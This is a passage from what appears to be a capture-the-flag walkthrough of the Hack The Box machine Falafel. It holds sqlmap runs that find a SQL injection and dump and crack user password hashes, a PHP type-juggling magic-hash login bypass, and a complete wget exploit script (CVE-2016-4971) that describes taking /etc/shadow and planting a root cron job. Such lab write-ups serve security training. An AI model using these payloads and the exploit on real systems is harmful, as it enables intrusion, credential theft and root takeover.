[18:04:59] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF - comment)'
[18:05:07] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
[18:05:19] [INFO] testing 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)'
[18:05:30] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)'
[18:05:37] [INFO] testing 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)'
[18:05:46] [INFO] testing 'Oracle AND time-based blind'
[18:05:57] [INFO] testing 'Oracle OR time-based blind'
[18:06:08] [INFO] testing 'Oracle AND time-based blind (comment)'
[18:06:16] [INFO] testing 'Oracle OR time-based blind (comment)'
[18:06:24] [INFO] testing 'Oracle AND time-based blind (heavy query)'
[18:06:35] [INFO] testing 'Oracle OR time-based blind (heavy query)'
[18:06:46] [INFO] testing 'Oracle AND time-based blind (heavy query - comment)'
[18:06:53] [INFO] testing 'Oracle OR time-based blind (heavy query - comment)'
[18:07:02] [INFO] testing 'IBM DB2 AND time-based blind (heavy query)'
[18:07:13] [INFO] testing 'IBM DB2 OR time-based blind (heavy query)'
[18:07:23] [INFO] testing 'IBM DB2 AND time-based blind (heavy query - comment)'
[18:07:31] [INFO] testing 'IBM DB2 OR time-based blind (heavy query - comment)'
[18:07:39] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[18:07:50] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[18:08:01] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
[18:08:09] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
[18:08:17] [INFO] testing 'Firebird >= 2.0 AND time-based blind (heavy query)'
[18:08:28] [INFO] testing 'Firebird >= 2.0 OR time-based blind (heavy query)'
[18:08:41] [INFO] testing 'Firebird >= 2.0 AND time-based blind (heavy query - comment)'
[18:08:49] [INFO] testing 'Firebird >= 2.0 OR time-based blind (heavy query - comment)'
[18:08:57] [INFO] testing 'SAP MaxDB AND time-based blind (heavy query)'
[18:09:08] [INFO] testing 'SAP MaxDB OR time-based blind (heavy query)'
[18:09:20] [INFO] testing 'SAP MaxDB AND time-based blind (heavy query - comment)'
[18:09:28] [INFO] testing 'SAP MaxDB OR time-based blind (heavy query - comment)'
[18:09:36] [INFO] testing 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)'
[18:09:47] [INFO] testing 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)'
[18:09:57] [INFO] testing 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)'
[18:10:06] [INFO] testing 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)'
[18:10:14] [INFO] testing 'HSQLDB > 2.0 AND time-based blind (heavy query)'
[18:10:25] [INFO] testing 'HSQLDB > 2.0 OR time-based blind (heavy query)'
[18:10:35] [INFO] testing 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)'
[18:10:43] [INFO] testing 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)'
[18:10:54] [INFO] testing 'Informix AND time-based blind (heavy query)'
[18:11:06] [INFO] testing 'Informix OR time-based blind (heavy query)'
[18:11:17] [INFO] testing 'Informix AND time-based blind (heavy query - comment)'
[18:11:25] [INFO] testing 'Informix OR time-based blind (heavy query - comment)'
[18:11:33] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[18:11:42] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[18:11:48] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[18:11:48] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[18:11:48] [INFO] testing 'MySQL <= 5.0.11 time-based blind - Parameter replace (heavy queries)'
[18:11:48] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[18:11:49] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[18:11:49] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[18:11:49] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[18:11:49] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[18:11:49] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)'
[18:11:50] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
[18:11:50] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
[18:11:50] [INFO] testing 'Oracle time-based blind - Parameter replace (heavy queries)'
[18:11:50] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
[18:11:50] [INFO] testing 'Firebird time-based blind - Parameter replace (heavy query)'
[18:11:51] [INFO] testing 'SAP MaxDB time-based blind - Parameter replace (heavy query)'
[18:11:51] [INFO] testing 'IBM DB2 time-based blind - Parameter replace (heavy query)'
[18:11:51] [INFO] testing 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)'
[18:12:02] [INFO] testing 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)'
[18:12:13] [INFO] testing 'Informix time-based blind - Parameter replace (heavy query)'
[18:12:13] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[18:12:13] [INFO] testing 'MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[18:12:14] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[18:12:14] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[18:12:15] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)'
[18:12:15] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
[18:12:16] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
[18:12:16] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[18:12:16] [INFO] testing 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[18:12:17] [INFO] testing 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[18:12:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:14:04] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:15:53] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:17:37] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:19:24] [WARNING] POST parameter 'password' does not seem to be injectable
[18:19:24] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')

[*] shutting down at 18:19:24

root@kali:~/falafet#
```

![](images/9.png)

![](images/10.png)

![](images/11.png)

```sh
root@kali:~/falafet# sqlmap -r login.req --level 5 --risk 3 -p username,password --batch --string "Wrong identification" --dbms MySQL
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:47:46

[16:47:46] [INFO] parsing HTTP request from 'login.req'
[16:47:46] [WARNING] provided parameters 'username, password' are not inside the Cookie
[16:47:46] [INFO] testing connection to the target URL
[16:47:47] [INFO] testing if the provided string is within the target URL page content
[16:47:47] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[16:47:47] [INFO] testing for SQL injection on POST parameter 'username'
[16:47:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:47:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:47:49] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:47:49] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:47:49] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:47:49] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[16:47:49] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[16:47:50] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:47:50] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:47:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:47:50] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:47:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:47:50] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:47:51] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:47:51] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[16:47:51] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[16:47:51] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:47:52] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[16:47:52] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[16:47:52] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[16:47:52] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[16:47:52] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[16:47:52] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[16:47:52] [INFO] testing 'MySQL inline queries'
[16:47:52] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[16:47:52] [WARNING] time-based comparison requires larger statistical model, please wait.... (done)
[16:47:53] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[16:47:53] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[16:47:53] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[16:47:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[16:47:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[16:47:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[16:47:54] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
[16:47:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (comment)'
[16:47:54] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (comment)'
[16:47:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:47:55] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[16:47:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[16:47:55] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[16:47:55] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query)'
[16:47:55] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query)'
[16:47:55] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query - comment)'
[16:47:56] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query - comment)'
[16:47:56] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[16:47:56] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[16:47:56] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[16:47:56] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[16:47:57] [INFO] testing 'MySQL AND time-based blind (ELT)'
[16:47:57] [INFO] testing 'MySQL OR time-based blind (ELT)'
[16:47:57] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[16:47:57] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[16:47:57] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:47:58] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:47:58] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[16:47:58] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[16:47:58] [INFO] testing 'MySQL <= 5.0.11 time-based blind - Parameter replace (heavy queries)'
[16:47:58] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[16:47:58] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[16:47:58] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[16:47:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:47:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:47:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:47:59] [INFO] target URL appears to have 4 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[16:48:08] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[16:48:12] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[16:48:16] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[16:48:20] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[16:48:24] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[16:48:28] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[16:48:32] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[16:48:36] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[16:48:40] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[16:48:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[16:48:48] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[16:48:52] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[16:48:56] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[16:49:00] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[16:49:05] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[16:49:09] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[16:49:13] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[16:49:17] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[16:49:21] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[16:49:25] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 520 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 4966=4966-- DItU&password=password
---
[16:49:31] [INFO] testing MySQL
[16:49:31] [INFO] confirming MySQL
[16:49:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.0
[16:49:31] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.73'

[*] shutting down at 16:49:31

root@kali:~/falafet#
```

```sh
root@kali:~/falafet# sqlmap -r login.req --level 5 --risk 3 -p username,password --batch --string "Wrong identification" --dbms MySQL --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:51:52

[16:51:52] [INFO] parsing HTTP request from 'login.req'
[16:51:53] [WARNING] provided parameters 'username, password' are not inside the Cookie
[16:51:53] [INFO] testing connection to the target URL
[16:51:53] [INFO] testing if the provided string is within the target URL page content
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 4966=4966-- DItU&password=password
---
[16:51:53] [INFO] testing MySQL
[16:51:53] [INFO] confirming MySQL
[16:51:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.0
[16:51:53] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[16:51:53] [INFO] fetching current database
[16:51:53] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[16:51:53] [INFO] retrieved: falafel
[16:52:02] [INFO] fetching tables for database: 'falafel'
[16:52:02] [INFO] fetching number of tables for database 'falafel'
[16:52:02] [INFO] retrieved: 1
[16:52:03] [INFO] retrieved: users
[16:52:09] [INFO] fetching columns for table 'users' in database 'falafel'
[16:52:09] [INFO] retrieved: 4
[16:52:10] [INFO] retrieved: ID
[16:52:13] [INFO] retrieved: username
[16:52:23] [INFO] retrieved: password
[16:52:33] [INFO] retrieved: role
[16:52:38] [INFO] fetching entries for table 'users' in database 'falafel'
[16:52:38] [INFO] fetching number of entries for table 'users' in database 'falafel'
[16:52:38] [INFO] retrieved: 2
[16:52:39] [INFO] retrieved: 1
[16:52:41] [INFO] retrieved: 0e462096931906507119562988736854
[16:53:30] [INFO] retrieved: admin
[16:53:37] [INFO] retrieved: admin
[16:53:44] [INFO] retrieved: 2
[16:53:46] [INFO] retrieved: d4ee02a22fc872e36d9e3751ba72ddc8
[16:54:33] [INFO] retrieved: normal
[16:54:41] [INFO] retrieved: chris
[16:54:49] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[16:54:49] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[16:54:49] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[16:54:49] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[16:54:49] [INFO] starting 4 processes
[16:54:54] [INFO] cracked password 'juggling' for user 'chris'
Database: falafel
Table: users
[2 entries]
+----+--------+----------+---------------------------------------------+
| ID | role   | username | password                                    |
+----+--------+----------+---------------------------------------------+
| 1  | admin  | admin    | 0e462096931906507119562988736854            |
| 2  | normal | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) |
+----+--------+----------+---------------------------------------------+

[16:54:59] [INFO] table 'falafel.users' dumped to CSV file '/root/.sqlmap/output/10.10.10.73/dump/falafel/users.csv'
[16:54:59] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.73'

[*] shutting down at 16:54:59

root@kali:~/falafet#
```

![](images/12.png)

###### [`PHP Type Juggling`](https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf)

![](images/13.png)

![](images/14.png)

![](images/15.png)

[`php 0e hash collision`](https://news.ycombinator.com/item?id=9484757)

```
admin
240610708
```

![](images/16.png)

![](images/17.png)

![](images/18.png)

![](images/19.png)

![](images/20.png)

```sh
root@kali:~/falafet# nc -nlvp 80
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.73.
Ncat: Connection from 10.10.10.73:34388.
GET /sample.png HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.16
Connection: Keep-Alive

root@kali:~/falafet#
```

###### Wget exploit and file name size exploit

```sh
root@kali:~/falafet# searchsploit wget
--------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                       |  Path
                                                                     | (/usr/share/exploitdb/)
--------------------------------------------------------------------- ----------------------------------------
GNU Wget 1.x - Multiple Vulnerabilities                              | exploits/linux/remote/24813.pl
GNU Wget < 1.18 - Access List Bypass / Race Condition                | exploits/multiple/remote/40824.py
GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution      | exploits/linux/remote/40064.txt
GNU wget - Cookie Injection                                          | exploits/linux/local/44601.txt
WGet 1.x - Insecure File Creation Race Condition                     | exploits/linux/local/24123.sh
feh 1.7 - '--wget-Timestamp' Remote Code Execution                   | exploits/linux/remote/34201.txt
wget 1.10.2 - Unchecked Boundary Condition Denial of Service         | exploits/multiple/dos/2947.pl
wget 1.9 - Directory Traversal                                       | exploits/multiple/remote/689.pl
--------------------------------------------------------------------- ----------------------------------------
--------------------------------------------------------------------- ----------------------------------------
 Shellcode Title                                                     |  Path
                                                                     | (/usr/share/exploitdb/)
--------------------------------------------------------------------- ----------------------------------------
Linux/x86 - execve wget + Mutated + Null-Free Shellcode (96 bytes)   | shellcodes/linux_x86/43739.c
Linux/x86 - execve(_/usr/bin/wget__ _aaaa_) Shellcode (42 bytes)     | shellcodes/linux_x86/13702.c
--------------------------------------------------------------------- ----------------------------------------
root@kali:~/falafet#
```

```sh
root@kali:~/falafet# searchsploit -m exploits/linux/remote/40064.txt
  Exploit: GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution
      URL: https://www.exploit-db.com/exploits/40064/
     Path: /usr/share/exploitdb/exploits/linux/remote/40064.txt
File Type: UTF-8 Unicode text, with CRLF line terminators

Copied to: /root/falafet/40064.txt


root@kali:~/falafet#
```

`wget-exploit.py`

```python
#!/usr/bin/env python

#
# Wget 1.18 < Arbitrary File Upload Exploit
# Dawid Golunski
# dawid( at )legalhackers.com
#
# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
#
# CVE-2016-4971
#

import SimpleHTTPServer
import SocketServer
import socket;

class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       # This takes care of sending .wgetrc

       print "We have a volunteer requesting " + self.path + " by GET :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
	  print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
       self.send_response(301)
       new_path = '%s'%('ftp://anonymous@%s:%s/shell.php'%(FTP_HOST, FTP_PORT) )
       print "Sending redirect to %s \n"%(new_path)
       self.send_header('Location', new_path)
       self.end_headers()

   def do_POST(self):
       # In here we will receive extracted file and install a PoC cronjob

       print "We have a volunteer requesting " + self.path + " by POST :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
	  print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       content_len = int(self.headers.getheader('content-length', 0))
       post_body = self.rfile.read(content_len)
       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)

       print "Sending back a cronjob script as a thank-you for the file..."
       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
       self.send_response(200)
       self.send_header('Content-type', 'text/plain')
       self.end_headers()
       self.wfile.write(ROOT_CRON)

       print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"

       return

HTTP_LISTEN_IP = '10.10.14.16'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.14.16'
FTP_PORT = 21

ROOT_CRON = "* * * * * root /usr/bin/id > /root/hacked-via-wget \n"

handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print "Ready? Is your FTP server running?"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
else:
   print "FTP is down :( Exiting."
   exit(1)

print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT

handler.serve_forever()
```

`cat shell.php`

```php
<?php echo("Success!!");?>
```

```sh
root@kali:~/falafet/wget# cat 40064.txt | grep pyftpdlib
attackers-server# sudo pip install pyftpdlib
attackers-server# python -m pyftpdlib -p21 -w
root@kali:~/falafet/wget#
```

```sh
root@kali:~/falafet/wget# pip install pyftpdlib
```

```sh
root@kali:~/falafet/wget# python -m pyftpdlib -p21 -w
/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
  RuntimeWarning)
[I 2018-06-24 17:58:42] >>> starting FTP server on 0.0.0.0:21, pid=5298 <<<
[I 2018-06-24 17:58:42] concurrency model: async
[I 2018-06-24 17:58:42] masquerade (NAT) address: None
[I 2018-06-24 17:58:42] passive ports: None
[I 2018-06-24 17:58:48] 10.10.14.16:45170-[] FTP session opened (connect)
[I 2018-06-24 17:58:59] 10.10.14.16:45284-[] FTP session opened (connect)
[I 2018-06-24 17:58:59] 10.10.14.16:45284-[anonymous] USER 'anonymous' logged in.
[I 2018-06-24 17:58:59] 10.10.14.16:45284-[anonymous] RETR /root/falafet/wget/shell.php completed=1 bytes=27 seconds=0.001
[I 2018-06-24 17:58:59] 10.10.14.16:45284-[anonymous] FTP session closed (disconnect).
```

```sh
root@kali:~/falafet/wget# python wget-exploit.py
Ready? Is your FTP server running?
FTP found open on 10.10.14.16:21. Let's go then

Serving wget exploit on port 80...


We have a volunteer requesting /asd by GET :)

Uploading .wgetrc via ftp redirect vuln. It should land in /root

10.10.14.16 - - [24/Jun/2018 17:58:59] "GET /asd HTTP/1.1" 301 -
Sending redirect to ftp://anonymous@10.10.14.16:21/shell.php
```

```sh
root@kali:~/falafet/wget# wget http://10.10.14.16/asd
--2018-06-24 17:58:59--  http://10.10.14.16/asd
Connecting to 10.10.14.16:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: ftp://anonymous@10.10.14.16:21/shell.php [following]
--2018-06-24 17:58:59--  ftp://anonymous@10.10.14.16/shell.php
           => ‘asd’
Connecting to 10.10.14.16:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> SIZE shell.php ... 27
==> PASV ... done.    ==> RETR shell.php ... done.
Length: 27 (unauthoritative)

asd                       100%[==================================>]      27  --.-KB/s    in 0s

2018-06-24 17:58:59 (3.52 MB/s) - ‘asd’ saved [27]

root@kali:~/falafet/wget#
```

![](images/22.png)

```sh
root@kali:~/falafet/wget# python -m pyftpdlib -p21 -w
/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
  RuntimeWarning)
[I 2018-06-24 18:03:07] >>> starting FTP server on 0.0.0.0:21, pid=5381 <<<
[I 2018-06-24 18:03:07] concurrency model: async
[I 2018-06-24 18:03:07] masquerade (NAT) address: None
[I 2018-06-24 18:03:07] passive ports: None
[I 2018-06-24 18:03:09] 10.10.14.16:47692-[] FTP session opened (connect)
[I 2018-06-24 18:03:10] 10.10.14.16:47706-[] FTP session opened (connect)
[I 2018-06-24 18:03:10] 10.10.14.16:47706-[anonymous] USER 'anonymous' logged in.
[I 2018-06-24 18:03:10] 10.10.14.16:47706-[anonymous] RETR /root/falafet/wget/shell.php completed=1 bytes=27 seconds=0.001
[I 2018-06-24 18:03:10] 10.10.14.16:47706-[anonymous] FTP session closed (disconnect).
```

```sh
root@kali:~/falafet/wget# python wget-exploit.py
Ready? Is your FTP server running?
FTP found open on 10.10.14.16:21. Let's go then

Serving wget exploit on port 80...


We have a volunteer requesting /asd by GET :)

Uploading .wgetrc via ftp redirect vuln. It should land in /root

10.10.14.16 - - [24/Jun/2018 18:03:10] "GET /asd HTTP/1.1" 301 -
Sending redirect to ftp://anonymous@10.10.14.16:21/shell.php
```

```sh
root@kali:~/falafet/wget# wget --trust-server-name http://10.10.14.16/asd
--2018-06-24 18:03:10--  http://10.10.14.16/asd
Connecting to 10.10.14.16:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: ftp://anonymous@10.10.14.16:21/shell.php [following]
--2018-06-24 18:03:10--  ftp://anonymous@10.10.14.16/shell.php
           => ‘shell.php.1’
Connecting to 10.10.14.16:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
